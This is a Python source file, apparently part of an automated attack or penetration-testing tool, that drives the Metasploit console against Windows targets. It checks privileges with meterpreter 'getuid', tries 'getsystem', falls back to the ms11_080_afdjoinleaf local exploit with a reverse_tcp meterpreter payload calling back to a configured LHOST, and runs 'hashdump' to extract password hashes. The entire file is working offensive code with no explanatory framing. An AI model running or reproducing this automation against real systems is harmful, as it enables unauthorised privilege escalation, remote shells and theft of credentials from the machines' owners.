
import os
import re
import time
import subprocess
from pathlib import Path
from dotenv import load_dotenv
# global variables
import config

################################################################################
# Envionment variable imports (API Keys etc)
################################################################################

load_dotenv()
# MSF_LHOST = os.getenv('MSF_LHOST')

################################################################################
# Priviledge Escalation commands
################################################################################

class PriviledgeEsc(object):
    """
    Defines a collection priviledge escalation commands and exploits
    """

    def update_priviledes(self, target_name, verbose = True):
        """
        User priviledges from meterpreter
        """
        if not config.MSFCONSOLE.shell:
            raise Exception("shell session with target not active")
            return
        cmd = "getuid"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)
        target = config.TARGETS[target_name]
        if 'AUTHORITY' in msf_reply:
            target.priv = 'admin'
        else:
            target.priv = 'user'

    def escalate_priviledges(self, target_name, verbose=True):
        """
        Escalate priviledges with meterpreter
        """
        target = config.TARGETS[target_name]
        original_priv = target.priv
        if not config.MSFCONSOLE.shell:
            raise Exception("shell session with target not active")
            return
        cmd = "getsystem"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)
        self.update_priviledes(target_name, verbose)
        if verbose:
            current_priv = target.priv
            if current_priv != original_priv:
                print("[+] priviledge escalation:", original_priv, "=>", current_priv)
                return
            else:
                print("[-] escalation (method 1) failed ")
        # local escalation (ms11_080)
        config.MSFCONSOLE.set_shell(False)
        cmd = "background"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "use exploit/windows/local/ms11_080_afdjoinleaf"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set SESSION 1"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set payload windows/meterpreter/reverse_tcp"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set LHOST " + config.MSF_LHOST
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "exploit"
        config.MSFCONSOLE.set_shell()
        config.MSFCONSOLE.callback(cmd, verbose=False, wait=10)
        self.update_priviledes(target_name, verbose)
        if verbose:
            current_priv = target.priv
            if current_priv != original_priv:
                print("[+] priviledge escalation:", original_priv, "=>", current_priv)
                return
            else:
                print("[-] escalation (method 2) failed ")

    def hashdump(self, target_name, verbose=True ):
        """
        Display hashed Windows passwords
        """
        target = config.TARGETS[target_name]
        if not config.MSFCONSOLE.shell:
            raise Exception("shell session with target not active")
            return
        cmd = "hashdump"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)





#
